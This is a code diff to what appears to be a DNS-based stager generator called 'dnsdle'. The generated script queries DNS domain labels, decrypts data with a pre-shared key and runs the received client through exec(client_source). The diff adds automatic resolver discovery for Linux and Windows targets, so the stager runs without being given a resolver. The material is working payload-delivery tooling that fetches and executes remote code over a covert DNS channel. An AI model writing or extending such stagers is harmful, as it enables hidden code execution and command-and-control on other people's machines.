@@ -1,7 +1,10 @@
 from __future__ import absolute_import, unicode_literals
 
+from dnsdle.client_template import _lift_resolver_source
+from dnsdle.state import StartupError
 
-_STAGER_TEMPLATE = '''#!/usr/bin/env python
+
+_STAGER_PREFIX = '''#!/usr/bin/env python
 # -*- coding: ascii -*-
 import base64
 import hashlib
@@ -12,6 +15,7 @@ import struct
 import sys
 import time
 import zlib
+@@EXTRA_IMPORTS@@
 
 DOMAIN_LABELS = @@DOMAIN_LABELS@@
 FILE_TAG = @@FILE_TAG@@
@@ -261,8 +265,25 @@ def _send_query(addr, pkt):
         except Exception:
             pass
     return resp
+'''
 
-# __RUNTIME__
+
+_STAGER_DISCOVER = '''
+
+def _discover_resolver():
+    for _h in @@LOADER_FN@@():
+        try:
+            _ai = socket.getaddrinfo(_h, 53, socket.AF_INET, socket.SOCK_DGRAM)
+            if _ai:
+                return _ai[0][4]
+        except Exception:
+            continue
+    raise ValueError("no resolver")
+
+'''
+
+
+_STAGER_SUFFIX = '''# __RUNTIME__
 _sa = sys.argv[1:]
 psk = None
 resolver = None
@@ -280,13 +301,15 @@ if not psk:
     psk = PSK
     _sa = ["--psk", psk] + list(_sa)
 if not resolver:
-    raise ValueError("--resolver required")
-host = resolver
-port = 53
-if ":" in resolver:
-    host, _port_s = resolver.rsplit(":", 1)
-    port = int(_port_s)
-addr = (host, port)
+    addr = _discover_resolver()
+    _sa = ["--resolver", "%s:%d" % addr] + list(_sa)
+else:
+    host = resolver
+    port = 53
+    if ":" in resolver:
+        host, _port_s = resolver.rsplit(":", 1)
+        port = int(_port_s)
+    addr = (host, port)
 pk = _ub(psk)
 ek = _enc_key(pk)
 mk = _mac_key(pk)
@@ -322,6 +345,23 @@ exec(client_source)
 '''
 
 
-def build_stager_template():
-    """Return the stager template source as a string."""
-    return _STAGER_TEMPLATE
+def build_stager_template(target_os):
+    """Return the stager template source as a string for the given OS."""
+    if target_os == "linux":
+        extra_imports = ""
+        lifted = _lift_resolver_source("resolver_linux.py")
+        loader_fn = "_load_unix_resolvers"
+    elif target_os == "windows":
+        extra_imports = "import re\nimport subprocess"
+        lifted = _lift_resolver_source("resolver_windows.py")
+        loader_fn = "_load_windows_resolvers"
+    else:
+        raise StartupError(
+            "startup",
+            "generator_invalid_contract",
+            "unsupported target_os for stager template",
+            {"target_os": target_os},
+        )
+    discover = _STAGER_DISCOVER.replace("@@LOADER_FN@@", loader_fn)
+    template = _STAGER_PREFIX + lifted + discover + _STAGER_SUFFIX
+    return template.replace("@@EXTRA_IMPORTS@@", extra_imports)
